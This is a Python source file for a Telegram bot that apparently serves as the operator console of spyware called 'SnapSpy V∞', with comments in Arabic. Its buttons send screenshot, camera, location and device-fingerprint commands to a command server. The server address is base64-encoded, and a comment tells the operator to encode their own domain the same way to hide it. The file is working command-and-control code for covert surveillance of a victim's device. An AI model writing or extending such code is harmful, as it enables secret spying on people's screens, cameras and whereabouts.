from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CallbackQueryHandler, CommandHandler, MessageHandler, ContextTypes, filters
import requests
import base64
import logging
from config import TELEGRAM_BOT_TOKEN

# إعداد تسجيل الأخطاء
logging.basicConfig(level=logging.INFO)

# 🔒 رابط السيرفر (شفّر دومينك ثم ضع الناتج في ENCODED_URL)
ENCODED_URL = "aHR0cDovLzEyNy4wLjAuMTo1MDAwLw=="
SERVER_URL = base64.b64decode(ENCODED_URL).decode()  # http://127.0.0.1:5000/

# ✅ رسالة الترحيب
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📸 لقطة شاشة", callback_data='screen')],
        [InlineKeyboardButton("📍 تحديد الموقع", callback_data='location')],
        [InlineKeyboardButton("🎥 الكاميرا", callback_data='camera')],
        [InlineKeyboardButton("🧠 معلومات الجهاز", callback_data='fingerprint')],
        [InlineKeyboardButton("ℹ️ حالة السيرفر", callback_data='status')],
        [InlineKeyboardButton("🛑 إيقاف", callback_data='stop')],
    ]
    markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🤖 أهلاً بك في وحدة تحكم SnapSpy V∞.\nاختر إجراء:", reply_markup=markup)

# 🧠 عند الضغط على زر
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await execute_command(query.data, update, context)

# 📝 أوامر كتابية مثل: camera
async def text_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text in ['screen', 'camera', 'location', 'stop', 'fingerprint', 'status']:
        await execute_command(text, update, context)

# 🚀 تنفيذ الأوامر
async def execute_command(command, update, context):
    chat_id = update.effective_chat.id
    await context.bot.send_message(chat_id=chat_id, text=f"🔄 جاري تنفيذ: `{command}`", parse_mode='Markdown')

    try:
        if command == 'status':
            check_url = f"{SERVER_URL}"
            response = requests.get(check_url)
            if response.status_code == 200:
                await context.bot.send_message(chat_id=chat_id, text="✅ السيرفر يعمل بشكل سليم.")
            else:
                await context.bot.send_message(chat_id=chat_id, text="⚠️ السيرفر لا يستجيب بشكل طبيعي.")
        else:
            url = f"{SERVER_URL}trigger/{command}"
            res = requests.post(url)
            if res.status_code == 200:
                await context.bot.send_message(chat_id=chat_id, text="✅ تم تنفيذ الأمر بنجاح.")
            else:
                await context.bot.send_message(chat_id=chat_id, text=f"⚠️ الرد غير متوقع: {res.status_code}")
    except Exception as e:
        logging.error(f"Error executing command '{command}': {e}")
        await context.bot.send_message(chat_id=chat_id, text=f"🚫 فشل التنفيذ:\n`{e}`", parse_mode='Markdown')

# 🚀 التشغيل
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_command))
    app.run_polling()

if __name__ == '__main__':
    main()
